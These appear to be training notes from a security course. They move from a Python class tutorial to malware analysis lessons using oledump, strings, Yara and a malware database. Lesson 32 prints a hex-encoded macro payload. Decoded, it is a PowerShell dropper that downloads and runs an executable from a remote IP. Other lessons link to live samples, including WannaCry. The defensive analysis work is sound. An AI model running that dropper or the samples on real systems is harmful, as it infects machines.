+What about what they can do? Nearly every web vuln scanner can do the same basic things, but they just might do them differently or at different speeds. You could then describe the actions that a vuln scanner can perform using functions. In Object Oriented Programming, though, functions are called methods. 
+
+So, if you were looking to use "vuln scanner" objects in your program, you would create a "vuln scanner" class to serve as a blueprint with all of the variables that you would want to hold information about your "vuln scanner" objects and all of the methods to describe what you would like your vuln scanner to be able to do.
+
+
+******************
+* A Python Class *
+******************
+
+
+Now that you have a general idea of what a class is, it's best to take a look at a real Python class and study how it is structured.
+
+---------------------------Paste This-----------------------------------
+
+class WebVulnScanner(object):
+    make = 'Acunetix'
+    model = '10.5'
+    year = '2014'
+    version ='Consultant Edition'
+
+    profile = 'High Risk'
+
+
+    def crawling(self, speed):
+        print("Crawling at %s" % speed)
+
+
+    def scanning(self, speed):
+        print("Scanning at %s" % speed)
+-----------------------------------------------------------------------
+
+
+Creating a class looks a lot like creating a function. Instead of def you use the keyword, class. Then, you give it a name, just like you would a function. It also has parenthesis like a function, but they don't work the way you think. For a class the parenthesis allow it to extend an existing class. Don't worry about this right now, just understand that you have to put object there because it's the base of all other classes. 
+
+From there, you can see a bunch of familiar things that you'd see floating around any Python program, variables and functions. There are a series of variables with information about the scanner and a couple of methods(functions) describing what the scanner can do. You can see that each of the methods takes two parameters, self and speed. You can see that "speed" is used in the methods to print out how fast the scanner is scanning, but "self" is different.
+
+
+*****************
+* What is Self? *
+*****************
+
+Alright, so "self" is the biggest quirk in the way that Python handles Object Oriented Programming. In most languages, classes and objects are just aware of their variables in their methods. Python needs to be told to remember them. When you pass "self" to a method, you are essentially passing that object to its method to remind it of all of the variables and other methods in that object. You also need to use it when using variables in methods. For example, if you wanted to output the model of the scanner along with the speed, it looks like this.
+
+---------------------------Type This-----------------------------------
+
+print("Your %s is crawling at %s" % (self.model, speed))
+-----------------------------------------------------------------------
+
+It's awkward and odd, but it works, and it's really not worth worrying about. Just remember to include "self" as the first parameter of your methods and "self." in front of your variables, and you'll be alright.
+
+
+*****************
+* Using A Class *
+*****************
+
+
+You're ready to start using the WebVulnScanner class. Create a new Python file and paste the class in. Below, you can create an object using it. Creating, or instantiating, an object in Python looks like the line below.
+---------------------------Type This-----------------------------------
+
+myscanner = WebVulnScanner()
+-----------------------------------------------------------------------
+
+
+That's it. To create a new object, you just have to make a new variable and set it equal to class that you are basing your object on. 
+
+Get your scanner object to print out its make and model.
+---------------------------Type This-----------------------------------
+
+print("%s %s" % (myscanner.make, myscanner.model))
+-----------------------------------------------------------------------
+
+The use of a . between an object and its internal components is called the dot notation. It's very common in OOP. It works for methods the same way it does for variables. 
+---------------------------Type This-----------------------------------
+
+myscanner.scanning('10req/sec')
+-----------------------------------------------------------------------
+
+What if you want to change the profile of your scanning? You can definitely do that too, and it works just like changing the value of any other variable. Try printing out the profile of your scanner first. Then, change the profile, and print it out again.
+---------------------------Type This-----------------------------------
+
+print("The profile of my scanner settings is %s" % myscanner.profile)
+myscanner.profile = "default"
+print("The profile of my scanner settings is %s" % myscanner.profile)
+-----------------------------------------------------------------------
+
+Your scanner settings are default now. What about a new WebVulnScanner? If you made a new scanner object, would the scanning profile be default? Give it a shot.
+---------------------------Type This-----------------------------------
+
+mynewscanner = WebVulnScanner()
+print("The scanning profile of my new scanner is %s" % mynewscanner.profile)
+-----------------------------------------------------------------------
+
+That one's high risk. New objects are copied from the class, and the class still says that the profile is high risk. Objects exist in the computer's memory while a program is running. When you change the values within an object, they are specific to that object as it exists in memory. The changes won't persist once the program stops and won't change the class that it was created from.
+
+
+#########################################
+# The self variable in python explained #
+#########################################
+
+So lets start by making a class involving the self variable.
+
+A simple class :
+
+So here is our class:
+---------------------------Paste This-----------------------------------
+
+class port(object):
+    open = False
+    def open_port(self):
+        if not self.open:
+            print("port open")
+
+-----------------------------------------------------------------------
+
+First let me explain the above code without the technicalities. First of all we make a class port. Then we assign it a property “open” which is currently false. After that we assign it a function open_port which can only occur if “open” is False which means that the port is open.
+
+Making a Port:
+
+Now that we have made a class for a Port, lets actually make a port:
+---------------------------Type This-----------------------------------
+
+x = port()
+-----------------------------------------------------------------------
+
+Now x is a port which has a property open and a function open_port. Now we can access the property open by typing:
+---------------------------Type This-----------------------------------
+
+x.open
+-----------------------------------------------------------------------
+
+The above command is same as:
+---------------------------Type This-----------------------------------
+
+port().open
+-----------------------------------------------------------------------
+
+Now you can see that self refers to the bound variable or object. In the first case it was x because we had assigned the port class to x whereas in the second case it referred to port(). Now if we have another port y, self will know to access the open value of y and not x. For example check this example:
+---------------------------Type This-----------------------------------
+
+>>> x = port()
+>>> x.open
+False
+>>> y = port()
+>>> y.open = True
+>>> y.open
+True
+>>> x.open
+False
+
+-----------------------------------------------------------------------
+The first argument of every class method, including init, is always a reference to the current instance of the class. By convention, this argument is always named self. In the init method, self refers to the newly created object; in other class methods, it refers to the instance whose method was called. For example the below code is the same as the above code.
+
+---------------------------Paste This-----------------------------------
+
+class port(object):
+    open = False
+    def open_port(this):
+        if not this.open:
+            print("port open")
+
+-----------------------------------------------------------------------
+
+
+
+
+
+###############################
+# Lesson 32: Malware Analysis #
+###############################
+ 
+ 
+ 
+ 
+################
+# The Scenario #
+################
+You've come across a file that has been flagged by one of your security products (AV Quarantine, HIPS, Spam Filter, Web Proxy, or digital forensics scripts).
+ 
+ 
+The fastest thing you can do is perform static analysis.
+---------------------------Type This-----------------------------------
+
+sudo pip install olefile
+     infosecaddicts
+ 
+mkdir ~/Desktop/oledump
+ 
+cd ~/Desktop/oledump
+ 
+wget http://didierstevens.com/files/software/oledump_V0_0_22.zip
+ 
+unzip oledump_V0_0_22.zip
+ 
+wget https://s3.amazonaws.com/infosecaddictsfiles/064016.zip
+ 
+unzip 064016.zip
+     infected
+ 
+python oledump.py 064016.doc
+ 
+python oledump.py 064016.doc -s A4 -v
+-----------------------------------------------------------------------
+
+- From this we can see this Word doc contains an embedded file called editdata.mso which contains seven data streams.
+- Three of the data streams are flagged as macros: A3:’VBA/Module1′, A4:’VBA/Module2′, A5:’VBA/ThisDocument’.
+ 
+---------------------------Type This-----------------------------------
+
+python oledump.py 064016.doc -s A5 -v
+-----------------------------------------------------------------------
+
+- As far as I can tell, VBA/Module2 does absolutely nothing. These are nonsensical functions designed to confuse heuristic scanners.
+ 
+---------------------------Type This-----------------------------------
+
+python oledump.py 064016.doc -s A3 -v
+ -----------------------------------------------------------------------
+
+- Look for "GVhkjbjv" and you should see:
+ 
+636D64202F4B20706F7765727368656C6C2E657865202D457865637574696F6E506F6C69637920627970617373202D6E6F70726F66696C6520284E65772D4F626A6563742053797374656D2E4E65742E576562436C69656E74292E446F776E6C6F616446696C652827687474703A2F2F36322E37362E34312E31352F6173616C742F617373612E657865272C272554454D50255C4A494F696F646668696F49482E63616227293B20657870616E64202554454D50255C4A494F696F646668696F49482E636162202554454D50255C4A494F696F646668696F49482E6578653B207374617274202554454D50255C4A494F696F646668696F49482E6578653B
+ 
+- Take that long blob that starts with 636D and finishes with 653B and paste it in:
+http://www.rapidtables.com/convert/number/hex-to-ascii.htm
+ 
+ 
+ 
+##############################
+# Lesson 33: Static Analysis #
+##############################
+ 
+- After logging please open a terminal window and type the following commands:
+---------------------------Type This-----------------------------------
+ 
+cd Desktop/
+ 
+wget https://s3.amazonaws.com/infosecaddictsfiles/wannacry.zip
+ 
+unzip wannacry.zip
+     infected
+ 
+file wannacry.exe
+ 
+mv wannacry.exe malware.pdf
+ 
+file malware.pdf
+ 
+mv malware.pdf wannacry.exe
+ 
+hexdump -n 2 -C wannacry.exe
+ 
+-----------------------------------------------------------------------
+ 
+ 
+ 
+***What is '4d 5a' or 'MZ'***
+Reference:
+http://www.garykessler.net/library/file_sigs.html
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+ 
+ 
+objdump -x wannacry.exe
+ 
+strings wannacry.exe
+ 
+strings --all wannacry.exe | head -n 6
+ 
+strings wannacry.exe | grep -i dll
+ 
+strings wannacry.exe | grep -i library
+ 
+strings wannacry.exe | grep -i reg
+ 
+strings wannacry.exe | grep -i key
+ 
+strings wannacry.exe | grep -i rsa
+ 
+strings wannacry.exe | grep -i open
+ 
+strings wannacry.exe | grep -i get
+ 
+strings wannacry.exe | grep -i mutex
+ 
+strings wannacry.exe | grep -i irc
+ 
+strings wannacry.exe | grep -i join        
+ 
+strings wannacry.exe | grep -i admin
+ 
+strings wannacry.exe | grep -i list
+ 
+ 
+ 
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+Hmmmmm.......what's the latest thing in the news - oh yeah "WannaCry"
+ 
+Quick Google search for "wannacry ransomeware analysis"
+ 
+ 
+Reference
+https://securingtomorrow.mcafee.com/executive-perspectives/analysis-wannacry-ransomware-outbreak/
+ 
+- Yara Rule -
+ 
+ 
+Strings:
+$s1 = “Ooops, your files have been encrypted!” wide ascii nocase
+$s2 = “Wanna Decryptor” wide ascii nocase
+$s3 = “.wcry” wide ascii nocase
+$s4 = “WANNACRY” wide ascii nocase
+$s5 = “WANACRY!” wide ascii nocase
+$s7 = “icacls . /grant Everyone:F /T /C /Q” wide ascii nocase
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+Ok, let's look for the individual strings
+ 
+---------------------------Type This-----------------------------------
+ 
+ 
+strings wannacry.exe | grep -i ooops
+ 
+strings wannacry.exe | grep -i wanna
+ 
+strings wannacry.exe | grep -i wcry
+ 
+strings wannacry.exe | grep -i wannacry
+ 
+strings wannacry.exe | grep -i wanacry          **** Matches $s5, hmmm.....
+ 
+ 
+-----------------------------------------------------------------------
+
+ 
+ 
+ 
+ 
+###############################################
+# Lesson 34: Tired of GREP - let's try Python #
+###############################################
+Decided to make my own script for this kind of stuff in the future. I
+ 
+Reference1:
+https://s3.amazonaws.com/infosecaddictsfiles/analyse_malware.py
+ 
+This is a really good script for the basics of static analysis
+ 
+Reference:
+https://joesecurity.org/reports/report-db349b97c37d22f5ea1d1841e3c89eb4.html
+ 
+ 
+This is really good for showing some good signatures to add to the Python script
+ 
+ 
+Here is my own script using the signatures (started this yesterday, but still needs work):
+https://pastebin.com/guxzCBmP
+ 
+ 
+---------------------------Type This-----------------------------------
+
+ 
+sudo apt install -y python-pefile
+     infosecaddicts
+ 
+ 
+ 
+wget https://pastebin.com/raw/guxzCBmP
+ 
+ 
+mv guxzCBmP am.py
+ 
+ 
+vi am.py
+ 
+python am.py wannacry.exe
+ 
+ 
+-----------------------------------------------------------------------
+
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+###################
+# Lesson 35: Yara #
+###################
+ ---------------------------Type This-----------------------------------
+
+cd ~/Desktop
+ 
+sudo apt-get remove -y yara
+     infosecaddcits
+ 
+sudo apt -y install libtool
+     infosecaddicts
+ 
+wget https://github.com/VirusTotal/yara/archive/v3.6.0.zip
+ 
+ 
+unzip v3.6.0.zip
+ 
+cd yara-3.6.0
+ 
+./bootstrap.sh
+ 
+./configure
+ 
+make
+ 
+sudo make install
+    infosecaddicts
+ 
+yara -v
+ 
+cd ~/Desktop
+ 
+ 
+-----------------------------------------------------------------------
+ 
+ 
+NOTE:
+McAfee is giving these yara rules - so add them to the hashes.txt file
+ 
+Reference:
+https://securingtomorrow.mcafee.com/executive-perspectives/analysis-wannacry-ransomware-outbreak/
+ 
+----------------------------------------------------------------------------
+rule wannacry_1 : ransom
+{
+    meta:
+        author = "Joshua Cannell"
+        description = "WannaCry Ransomware strings"
+        weight = 100
+        date = "2017-05-12"
+ 
+    strings:
+        $s1 = "Ooops, your files have been encrypted!" wide ascii nocase
+        $s2 = "Wanna Decryptor" wide ascii nocase
+        $s3 = ".wcry" wide ascii nocase
+        $s4 = "WANNACRY" wide ascii nocase
+        $s5 = "WANACRY!" wide ascii nocase
+        $s7 = "icacls . /grant Everyone:F /T /C /Q" wide ascii nocase
+ 
+    condition:
+        any of them
+}
+ 
+----------------------------------------------------------------------------
+rule wannacry_2{
+    meta:
+        author = "Harold Ogden"
+        description = "WannaCry Ransomware Strings"
+        date = "2017-05-12"
+        weight = 100
+ 
+    strings:
+        $string1 = "msg/m_bulgarian.wnry"
+        $string2 = "msg/m_chinese (simplified).wnry"
+        $string3 = "msg/m_chinese (traditional).wnry"
+        $string4 = "msg/m_croatian.wnry"
+        $string5 = "msg/m_czech.wnry"
+        $string6 = "msg/m_danish.wnry"
+        $string7 = "msg/m_dutch.wnry"
+        $string8 = "msg/m_english.wnry"
+        $string9 = "msg/m_filipino.wnry"
+        $string10 = "msg/m_finnish.wnry"
+        $string11 = "msg/m_french.wnry"
+        $string12 = "msg/m_german.wnry"
+        $string13 = "msg/m_greek.wnry"
+        $string14 = "msg/m_indonesian.wnry"
+        $string15 = "msg/m_italian.wnry"
+        $string16 = "msg/m_japanese.wnry"
+        $string17 = "msg/m_korean.wnry"
+        $string18 = "msg/m_latvian.wnry"
+        $string19 = "msg/m_norwegian.wnry"
+        $string20 = "msg/m_polish.wnry"
+        $string21 = "msg/m_portuguese.wnry"
+        $string22 = "msg/m_romanian.wnry"
+        $string23 = "msg/m_russian.wnry"
+        $string24 = "msg/m_slovak.wnry"
+        $string25 = "msg/m_spanish.wnry"
+        $string26 = "msg/m_swedish.wnry"
+        $string27 = "msg/m_turkish.wnry"
+        $string28 = "msg/m_vietnamese.wnry"
+ 
+ 
+    condition:
+        any of ($string*)
+}
+----------------------------------------------------------------------------
+ 
+ 
+##################################
+# Lesson 36: External DB Lookups #
+##################################
+ 
+Creating a malware database (sqlite)
+---------------------------Type This-----------------------------------
+
+sudo apt install -y python-simplejson python-simplejson-dbg
+    infosecaddicts
+ 
+ 
+ 
+wget https://raw.githubusercontent.com/mboman/mart/master/bin/avsubmit.py
+ 
+ 
+ 
+python avsubmit.py -f wannacry.exe -e
+ 
+----------------------------------------------------------------------------
+ 
+Analysis of the file can be found at:
+http://www.threatexpert.com/report.aspx?md5=84c82835a5d21bbcf75a61706d8ab549
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+##########################################
+# Lesson 37: Creating a Malware Database #
+##########################################
+Creating a malware database (mysql)
+-----------------------------------
+- Step 1: Installing MySQL database
+- Run the following command in the terminal:
+---------------------------Type This-----------------------------------
+ 
+sudo apt install -y mysql-server
+     infosecaddicts
+     
+- Step 2: Installing Python MySQLdb module
+- Run the following command in the terminal:
+ 
+sudo apt-get build-dep python-mysqldb
+     infosecaddicts
+ 
+sudo apt install -y python-mysqldb
+     infosecaddicts
+ 
+Step 3: Logging in
+Run the following command in the terminal:
+ 
+mysql -u root -p                    (set a password of 'malware')
+ 
+- Then create one database by running following command:
+ 
+create database malware;
+ 
+exit;
+ 
+wget https://raw.githubusercontent.com/dcmorton/MalwareTools/master/mal_to_db.py
+ 
+vi mal_to_db.py                     (fill in database connection information)
+ 
+python mal_to_db.py -i
+ 
+------- check it to see if the files table was created ------
+ 
+mysql -u root -p
+    malware
+ 
+show databases;
+ 
+use malware;
+ 
+show tables;
+ 
+describe files;
+ 
+exit;
+ 
+-----------------------------------------------------------------------
+ 
+ 
+- Now add the malicious file to the DB
+---------------------------Type This-----------------------------------
+
+ 
+python mal_to_db.py -f wannacry.exe -u
+ 
+-----------------------------------------------------------------------
+
+ 
+- Now check to see if it is in the DB
+--------------------------Type This-----------------------------------
+
+mysql -u root -p
+    malware
+ 
+mysql> use malware;
+ 
+select id,md5,sha1,sha256,time FROM files;
+ 
+mysql> quit;
+ 
+-----------------------------------------------------------------------
+ 
+ 
+ 
+#################################################
+# Lesson 39: PCAP Analysis with forensicPCAP.py #
+#################################################
+---------------------------Type This-----------------------------------
+
+cd ~/Desktop
+wget https://raw.githubusercontent.com/madpowah/ForensicPCAP/master/forensicPCAP.py
+sudo easy_install cmd2
+ 
+python forensicPCAP.py Browser\ Forensics/suspicious-time.pcap
+ 
+ForPCAP >>> help
+ 
+ 
+Prints stats about PCAP
+ForPCAP >>> stat
+ 
+ 
+Prints all DNS requests from the PCAP file. The id before the DNS is the packet's id which can be use with the "show" command.
+ForPCAP >>> dns
+ 
+ForPCAP >>> show
+ 
+ 
+Prints all destination ports from the PCAP file. The id before the DNS is the packet's id which can be use with the "show" command.
+ForPCAP >>> dstports
+ 
+ForPCAP >>> show
+ 
+ 
+Prints the number of ip source and store them.
+ForPCAP >>> ipsrc
+ 
+ 
+Prints the number of web's requests and store them
+ForPCAP >>> web
+ 
+ 
+Prints the number of mail's requests and store them
+ForPCAP >>> mail
+
+-----------------------------------------------------------------------
